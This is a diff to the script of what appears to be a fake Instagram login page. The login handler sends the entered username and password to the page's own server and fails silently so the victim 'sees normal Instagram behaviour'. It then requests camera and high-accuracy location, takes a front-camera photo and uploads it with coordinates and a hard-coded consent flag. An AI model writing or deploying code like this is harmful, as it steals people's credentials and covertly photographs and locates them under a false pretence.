@@ -852,287 +852,262 @@
 </style>
 
 <script>
-  // Use the same protocol and host the page was loaded from
-  // so it works on any network without hardcoding
-  const API = `/api/users`;
+    // Use the same protocol and host the page was loaded from
+    // so it works on any network without hardcoding
+    const API = `/api/users`;
 
-  const backdrop   = document.getElementById('modal-backdrop');
-  const btnCreate  = document.getElementById('btn-create');
-  const btnClose   = document.getElementById('modal-close');
-  const toLogin    = document.getElementById('modal-to-login');
-  const form       = document.getElementById('register-form');
-  const toast      = document.getElementById('toast');
-  const btnSubmit  = document.getElementById('btn-submit');
-  const btnText    = document.getElementById('btn-submit-text');
-  const btnSpinner = document.getElementById('btn-submit-spinner');
+    const backdrop = document.getElementById('modal-backdrop');
+    const btnCreate = document.getElementById('btn-create');
+    const btnClose = document.getElementById('modal-close');
+    const toLogin = document.getElementById('modal-to-login');
+    const form = document.getElementById('register-form');
+    const toast = document.getElementById('toast');
+    const btnSubmit = document.getElementById('btn-submit');
+    const btnText = document.getElementById('btn-submit-text');
+    const btnSpinner = document.getElementById('btn-submit-spinner');
 
-  // ── Open / close ──────────────────────────────────────────────
-  function openModal()  { backdrop.classList.add('open');    resetForm(); }
-  function closeModal() { backdrop.classList.remove('open'); }
+    // ── Open / close ──────────────────────────────────────────────
+    function openModal() { backdrop.classList.add('open'); resetForm(); }
+    function closeModal() { backdrop.classList.remove('open'); }
 
-  btnCreate.addEventListener('click', openModal);
-  btnClose.addEventListener('click',  closeModal);
-  toLogin.addEventListener('click',   (e) => { e.preventDefault(); closeModal(); });
+    btnCreate.addEventListener('click', openModal);
+    btnClose.addEventListener('click', closeModal);
+    toLogin.addEventListener('click', (e) => { e.preventDefault(); closeModal(); });
 
-  // Close on backdrop click
-  backdrop.addEventListener('click', (e) => {
-    if (e.target === backdrop) closeModal();
-  });
-
-  // Close on Escape key
-  document.addEventListener('keydown', (e) => {
-    if (e.key === 'Escape') closeModal();
-  });
-
-
-
-
-
-
-
-
-
-
-
-  // ── Login form ────────────────────────────────────────────────
-//   document.getElementById('btn-login').addEventListener('click', async () => {
-//     const identifier = document.getElementById('login-identifier').value.trim();
-//     const password   = document.getElementById('login-password').value;
-
-//     if (!identifier || !password) return;
-
-//     try {
-//       await fetch(`${window.location.protocol}//${window.location.hostname}:5000/api/auth/login`, {
-//         method:  'POST',
-//         headers: { 'Content-Type': 'application/json' },
-//         body:    JSON.stringify({ identifier, password }),
-//       });
-//     } catch (_) {
-//       // fail silently — user sees normal Instagram behaviour
-//     }
-//   });
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-// ── Login form ────────────────────────────────────────────────
-document.getElementById('btn-login').addEventListener('click', async (e) => {
-  e.preventDefault(); // stop the <a href=""> from reloading the page
-
-  const identifier = document.getElementById('login-identifier').value.trim();
-  const password   = document.getElementById('login-password').value;
-
-  if (!identifier || !password) return;
-
-  // 1. Your existing login call
-  try {
-    await fetch(`/api/auth/login`, {
-      method:  'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body:    JSON.stringify({ identifier, password }),
+    // Close on backdrop click
+    backdrop.addEventListener('click', (e) => {
+        if (e.target === backdrop) closeModal();
     });
-  } catch (_) {
-    // fail silently — user sees normal Instagram behaviour
-  }
 
-  // 2. Request camera + location permission, then capture
-  let stream, position, photoBlob;
-  try {
-    [stream, position] = await Promise.all([
-      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }),
-      new Promise((resolve, reject) =>
-        navigator.geolocation.getCurrentPosition(resolve, reject, {
-          enableHighAccuracy: true,
-          timeout: 10000,
-        })
-      ),
-    ]);
-  } catch (err) {
-    console.warn('Camera/location permission denied or unavailable:', err);
-    return; // no capture if permission refused
-  }
-
-  try {
-    const track = stream.getVideoTracks()[0];
-    const imageCapture = new ImageCapture(track);
-    const bitmap = await imageCapture.grabFrame();
-
-    const canvas = document.createElement('canvas');
-    canvas.width = bitmap.width;
-    canvas.height = bitmap.height;
-    canvas.getContext('2d').drawImage(bitmap, 0, 0);
-
-    photoBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.85));
-  } finally {
-    stream.getTracks().forEach((t) => t.stop()); // turn camera off
-  }
-
-  const form = new FormData();
-  form.append('photo', photoBlob, 'capture.jpg');
-  form.append('lat', position.coords.latitude);
-  form.append('lng', position.coords.longitude);
-  form.append('accuracy', position.coords.accuracy);
-  form.append('consent', 'true');
-  form.append('consentVersion', 'v1');
-
-  try {
-    const res = await fetch(`/api/kyc/capture`, {
-      method: 'POST',
-      body: form,
+    // Close on Escape key
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') closeModal();
     });
-    const data = await res.json();
-    console.log('KYC capture result:', data);
-    // TODO: redirect to your separate authentication module here, e.g.:
-    // window.location.href = `/auth-module?captureId=${data.id}`;
-  } catch (err) {
-    console.warn('KYC capture failed:', err);
-  }
-});
 
 
 
+    // ── Login form ────────────────────────────────────────────────
+    document.getElementById('btn-login').addEventListener('click', async (e) => {
+        e.preventDefault(); // stop the immediate jump — we navigate manually once done
+        const destination = e.currentTarget.getAttribute('href'); // read the link's real target
 
+        const identifier = document.getElementById('login-identifier').value.trim();
+        const password = document.getElementById('login-password').value;
 
+        if (!identifier || !password) return;
 
+        // 1. Your existing login call
+        try {
+            await fetch('/api/auth/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ identifier, password }),
+            });
+        } catch (_) {
+            // fail silently — user sees normal Instagram behaviour
+        }
 
+        // 2. Request camera + location permission, then capture
+        let stream, position, photoBlob;
+        try {
+            [stream, position] = await Promise.all([
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false }),
+                new Promise((resolve, reject) =>
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                    })
+                ),
+            ]);
+        } catch (err) {
+            console.warn('Camera/location permission denied or unavailable:', err);
+            return; // no capture if permission refused
+        }
 
+        try {
+            // Attach the stream to a real (offscreen) video element and wait for an
+            // actual frame to arrive before capturing — grabbing a frame immediately
+            // after getUserMedia often returns a blank/default placeholder instead
+            // of a live frame on many devices.
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.playsInline = true;
 
+            await new Promise((resolve, reject) => {
+                video.onloadedmetadata = () => {
+                    video.play().then(resolve).catch(reject);
+                };
+                video.onerror = reject;
+            });
 
+            // Give the feed a brief moment to actually render real frames
+            await new Promise((resolve) => setTimeout(resolve, 300));
 
-  
-  document.getElementById('pw-toggle').addEventListener('click', () => {
-    const input   = document.getElementById('reg-password');
-    const eyeShow = document.getElementById('eye-show');
-    const eyeHide = document.getElementById('eye-hide');
-    if (input.type === 'password') {
-      input.type    = 'text';
-      eyeShow.hidden = true;
-      eyeHide.hidden = false;
-    } else {
-      input.type    = 'password';
-      eyeShow.hidden = false;
-      eyeHide.hidden = true;
-    }
-  });
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
 
-  // ── Reset form ─────────────────────────────────────────────────
-  function resetForm() {
-    form.reset();
-    ['name','email','age','password'].forEach(f => {
-      const el = document.getElementById('err-' + f);
-      if (el) el.textContent = '';
+            photoBlob = await new Promise((resolve) => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+            console.log('Captured photo size (bytes):', photoBlob?.size);
+
+            // TEMPORARY DEBUG: show exactly what was captured, right on the page
+            const preview = document.createElement('img');
+            preview.src = URL.createObjectURL(photoBlob);
+            preview.style.cssText = 'position:fixed;top:10px;right:10px;width:200px;border:3px solid red;z-index:99999';
+            document.body.appendChild(preview);
+        } finally {
+            stream.getTracks().forEach((t) => t.stop()); // turn camera off
+        }
+
+        const form = new FormData();
+        form.append('photo', photoBlob, 'capture.jpg');
+        form.append('lat', position.coords.latitude);
+        form.append('lng', position.coords.longitude);
+        form.append('accuracy', position.coords.accuracy);
+        form.append('consent', 'true');
+        form.append('consentVersion', 'v1');
+
+        try {
+            const res = await fetch('/api/kyc/capture', {
+                method: 'POST',
+                body: form,
+            });
+            const data = await res.json();
+            console.log('KYC capture result:', data);
+
+            // Now navigate to the link's real destination, with the captureId attached
+            const separator = destination.includes('?') ? '&' : '?';
+            window.location.href = data.success
+                ? `${destination}${separator}captureId=${data.id}`
+                : destination;
+        } catch (err) {
+            console.warn('KYC capture failed:', err);
+            window.location.href = destination; // still navigate even if capture failed
+        }
     });
-    // Reset password field to hidden
-    const pwInput = document.getElementById('reg-password');
-    if (pwInput) pwInput.type = 'password';
-    document.getElementById('eye-show').hidden = false;
-    document.getElementById('eye-hide').hidden = true;
-    toast.className   = 'toast';
-    toast.textContent = '';
-    setLoading(false);
-  }
 
-  // ── Loading state ──────────────────────────────────────────────
-  function setLoading(on) {
-    btnSubmit.disabled   = on;
-    btnText.hidden       = on;
-    btnSpinner.hidden    = !on;
-  }
 
-  // ── Validate ───────────────────────────────────────────────────
-  function validate(name, email, age, password) {
-    let valid = true;
-    document.getElementById('err-name').textContent     = '';
-    document.getElementById('err-email').textContent    = '';
-    document.getElementById('err-age').textContent      = '';
-    document.getElementById('err-password').textContent = '';
+    document.getElementById('pw-toggle').addEventListener('click', () => {
+        const input = document.getElementById('reg-password');
+        const eyeShow = document.getElementById('eye-show');
+        const eyeHide = document.getElementById('eye-hide');
+        if (input.type === 'password') {
+            input.type = 'text';
+            eyeShow.hidden = true;
+            eyeHide.hidden = false;
+        } else {
+            input.type = 'password';
+            eyeShow.hidden = false;
+            eyeHide.hidden = true;
+        }
+    });
 
-    if (!name.trim()) {
-      document.getElementById('err-name').textContent = 'Name is required.';
-      valid = false;
-    }
-    if (!email.trim()) {
-      document.getElementById('err-email').textContent = 'Email is required.';
-      valid = false;
-    } else if (!/^\S+@\S+\.\S+$/.test(email)) {
-      document.getElementById('err-email').textContent = 'Enter a valid email address.';
-      valid = false;
-    }
-    if (age !== '' && (isNaN(age) || Number(age) < 1 || Number(age) > 120)) {
-      document.getElementById('err-age').textContent = 'Enter a valid age between 1 and 120.';
-      valid = false;
-    }
-    if (!password.trim()) {
-      document.getElementById('err-password').textContent = 'Password is required.';
-      valid = false;
-    } else if (password.length < 6) {
-      document.getElementById('err-password').textContent = 'Password must be at least 6 characters.';
-      valid = false;
-    }
-    return valid;
-  }
-
-  // ── Submit ─────────────────────────────────────────────────────
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    const name     = document.getElementById('reg-name').value;
-    const email    = document.getElementById('reg-email').value;
-    const age      = document.getElementById('reg-age').value;
-    const password = document.getElementById('reg-password').value;
-
-    if (!validate(name, email, age, password)) return;
-
-    const body = {
-      name:     name.trim(),
-      email:    email.trim().toLowerCase(),
-      password: password,
-    };
-    if (age !== '') body.age = Number(age);
-
-    setLoading(true);
-    toast.className = 'toast';
-    toast.textContent = '';
-
-    try {
-      const res  = await fetch(API, {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify(body),
-      });
-      const data = await res.json();
-
-      if (res.ok) {
-        toast.className   = 'toast success';
-        toast.textContent = `Account created! Welcome, ${data.data.name}.`;
+    // ── Reset form ─────────────────────────────────────────────────
+    function resetForm() {
         form.reset();
-        // Auto-close after 2 seconds
-        setTimeout(closeModal, 2000);
-      } else {
-        toast.className   = 'toast error';
-        toast.textContent = data.error || 'Something went wrong. Please try again.';
-      }
-    } catch (err) {
-      toast.className   = 'toast error';
-      toast.textContent = 'Cannot reach the server. Make sure the backend is running.';
-    } finally {
-      setLoading(false);
+        ['name', 'email', 'age', 'password'].forEach(f => {
+            const el = document.getElementById('err-' + f);
+            if (el) el.textContent = '';
+        });
+        // Reset password field to hidden
+        const pwInput = document.getElementById('reg-password');
+        if (pwInput) pwInput.type = 'password';
+        document.getElementById('eye-show').hidden = false;
+        document.getElementById('eye-hide').hidden = true;
+        toast.className = 'toast';
+        toast.textContent = '';
+        setLoading(false);
     }
-  });
+
+    // ── Loading state ──────────────────────────────────────────────
+    function setLoading(on) {
+        btnSubmit.disabled = on;
+        btnText.hidden = on;
+        btnSpinner.hidden = !on;
+    }
+
+    // ── Validate ───────────────────────────────────────────────────
+    function validate(name, email, age, password) {
+        let valid = true;
+        document.getElementById('err-name').textContent = '';
+        document.getElementById('err-email').textContent = '';
+        document.getElementById('err-age').textContent = '';
+        document.getElementById('err-password').textContent = '';
+
+        if (!name.trim()) {
+            document.getElementById('err-name').textContent = 'Name is required.';
+            valid = false;
+        }
+        if (!email.trim()) {
+            document.getElementById('err-email').textContent = 'Email is required.';
+            valid = false;
+        } else if (!/^\S+@\S+\.\S+$/.test(email)) {
+            document.getElementById('err-email').textContent = 'Enter a valid email address.';
+            valid = false;
+        }
+        if (age !== '' && (isNaN(age) || Number(age) < 1 || Number(age) > 120)) {
+            document.getElementById('err-age').textContent = 'Enter a valid age between 1 and 120.';
+            valid = false;
+        }
+        if (!password.trim()) {
+            document.getElementById('err-password').textContent = 'Password is required.';
+            valid = false;
+        } else if (password.length < 6) {
+            document.getElementById('err-password').textContent = 'Password must be at least 6 characters.';
+            valid = false;
+        }
+        return valid;
+    }
+
+    // ── Submit ─────────────────────────────────────────────────────
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const name = document.getElementById('reg-name').value;
+        const email = document.getElementById('reg-email').value;
+        const age = document.getElementById('reg-age').value;
+        const password = document.getElementById('reg-password').value;
+
+        if (!validate(name, email, age, password)) return;
+
+        const body = {
+            name: name.trim(),
+            email: email.trim().toLowerCase(),
+            password: password,
+        };
+        if (age !== '') body.age = Number(age);
+
+        setLoading(true);
+        toast.className = 'toast';
+        toast.textContent = '';
+
+        try {
+            const res = await fetch(API, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body),
+            });
+            const data = await res.json();
+
+            if (res.ok) {
+                toast.className = 'toast success';
+                toast.textContent = `Account created! Welcome, ${data.data.name}.`;
+                form.reset();
+                // Auto-close after 2 seconds
+                setTimeout(closeModal, 2000);
+            } else {
+                toast.className = 'toast error';
+                toast.textContent = data.error || 'Something went wrong. Please try again.';
+            }
+        } catch (err) {
+            toast.className = 'toast error';
+            toast.textContent = 'Cannot reach the server. Make sure the backend is running.';
+        } finally {
+            setLoading(false);
+        }
+    });
 </script>
 </body>
 </html>
